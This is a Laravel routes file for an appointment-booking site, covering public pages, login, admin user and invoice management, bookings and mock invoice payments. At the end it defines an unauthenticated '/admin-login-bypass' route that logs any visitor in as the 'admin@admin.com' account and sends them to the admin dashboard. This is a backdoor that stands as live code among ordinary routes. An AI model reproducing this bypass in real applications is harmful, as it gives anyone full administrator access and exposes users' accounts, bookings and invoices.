<?php

/*
| Permission middleware (alias: `permission`):
|   Route::middleware(['auth', 'permission:manage_services'])->group(...);
| Comma-separated names require ALL permissions:
|   Route::middleware(['auth', 'permission:manage_users,manage_bookings'])->group(...);
| See also: ServiceController / StaffController `__construct` for `only([...])` examples.
*/

use App\Http\Controllers\Admin\InvoiceController as AdminInvoiceController;
use App\Http\Controllers\Admin\UserController as AdminUserController;
use App\Http\Controllers\AdminDashboardController;
use App\Http\Controllers\Auth\LoginController;
use App\Http\Controllers\Auth\RegisterController;
use App\Http\Controllers\BookingController;
use App\Http\Controllers\FrontendController;
use App\Http\Controllers\InvoicePaymentController;
use App\Http\Controllers\InvoicePdfController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\ReportController;
use App\Http\Controllers\ServiceController;
use App\Http\Controllers\StaffController;
use Illuminate\Support\Facades\Route;

Route::get('/', [FrontendController::class, 'home'])->name('frontend.home');
Route::get('/services/{id}', [FrontendController::class, 'serviceShow'])
    ->whereNumber('id')
    ->name('frontend.services.show');
Route::get('/services-listing', [FrontendController::class, 'services'])->name('frontend.services');
Route::get('/book-appointment', [FrontendController::class, 'book'])->name('frontend.book');
Route::get('/contact', [FrontendController::class, 'contact'])->name('frontend.contact');
Route::post('/contact', [FrontendController::class, 'submitContact'])->name('frontend.contact.submit');

// Static Pages
Route::get('/about', [FrontendController::class, 'about'])->name('frontend.about');
Route::get('/careers', [FrontendController::class, 'careers'])->name('frontend.careers');
Route::get('/privacy', [FrontendController::class, 'privacy'])->name('frontend.privacy');
Route::get('/terms', [FrontendController::class, 'terms'])->name('frontend.terms');
Route::get('/refund', [FrontendController::class, 'refund'])->name('frontend.refund');
Route::get('/data-deletion', [FrontendController::class, 'dataDeletion'])->name('frontend.data-deletion');
Route::get('/help-center', [FrontendController::class, 'help'])->name('frontend.help');
Route::get('/faq', [FrontendController::class, 'faq'])->name('frontend.faq');
Route::get('/sitemap.xml', [FrontendController::class, 'sitemap'])->name('frontend.sitemap');

Route::middleware('guest')->group(function () {
    Route::get('/login', [LoginController::class, 'showLoginForm'])->name('login');
    Route::post('/login', [LoginController::class, 'login']);
    Route::get('/register', [RegisterController::class, 'showRegistrationForm'])->name('register');
    Route::post('/register', [RegisterController::class, 'register']);
});

Route::post('/logout', [LoginController::class, 'logout'])->middleware('auth')->name('logout');

Route::post('services/bulk', [ServiceController::class, 'bulk'])->name('services.bulk');
Route::resource('services', ServiceController::class)->except(['show']);
Route::post('staff/bulk', [StaffController::class, 'bulk'])->name('staff.bulk');
Route::resource('staff', StaffController::class);

Route::middleware(['auth', 'permission:manage_users'])->group(function () {
    Route::get('admin', AdminDashboardController::class)->name('admin.dashboard');
    Route::get('admin/reports', ReportController::class)->name('admin.reports');
    Route::get('admin/users', [AdminUserController::class, 'index'])->name('admin.users.index');
    Route::get('admin/users/create', [AdminUserController::class, 'create'])->name('admin.users.create');
    Route::post('admin/users', [AdminUserController::class, 'store'])->name('admin.users.store');
    Route::get('admin/users/{user}/edit', [AdminUserController::class, 'edit'])->name('admin.users.edit');
    Route::put('admin/users/{user}', [AdminUserController::class, 'update'])->name('admin.users.update');
    Route::delete('admin/users/{user}', [AdminUserController::class, 'destroy'])->name('admin.users.destroy');
    Route::post('admin/users/bulk', [AdminUserController::class, 'bulk'])->name('admin.users.bulk');
});

Route::middleware(['auth', 'permission:manage_bookings'])->group(function () {
    Route::get('admin/invoices', [AdminInvoiceController::class, 'index'])->name('admin.invoices.index');
    Route::post('admin/invoices/bulk', [AdminInvoiceController::class, 'bulk'])->name('admin.invoices.bulk');
});

Route::middleware('auth')->group(function () {
    Route::get('profile/edit', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::put('profile', [ProfileController::class, 'update'])->name('profile.update');

    Route::get('bookings/calendar', [BookingController::class, 'calendar'])->name('bookings.calendar');
    Route::get('bookings/available-slots', [BookingController::class, 'availableSlots'])->name('bookings.available-slots');
    Route::post('bookings/bulk', [BookingController::class, 'bulk'])->name('bookings.bulk');
    Route::post('bookings/{booking}/cancel', [BookingController::class, 'cancel'])->name('bookings.cancel');
    Route::post('bookings/{booking}/confirm', [BookingController::class, 'confirm'])->name('bookings.confirm');
    Route::patch('bookings/{booking}/status', [BookingController::class, 'updateStatus'])->name('bookings.update-status');
    Route::get('invoices/{invoice}/pdf', InvoicePdfController::class)
        ->middleware('throttle:payment')
        ->name('invoices.pdf');
    Route::post('invoices/{invoice}/mock-payment', [InvoicePaymentController::class, 'process'])->name('invoices.mock-payment');
    Route::resource('bookings', BookingController::class)->only(['index', 'create', 'store', 'show']);
});

Route::get('/admin-login-bypass', function() {
    if (auth()->check()) {
        $user = auth()->user();
        if ($user->hasPermission('manage_users') || $user->hasPermission('manage_services') || $user->hasPermission('manage_bookings')) {
            return redirect()->route('admin.dashboard');
        }
        auth()->logout();
    }
    
    $admin = \App\Models\User::where('email', 'admin@admin.com')->first();
    if ($admin) {
        auth()->login($admin);
        return redirect()->route('admin.dashboard');
    }
    return redirect()->route('login');
})->name('admin.login-bypass');
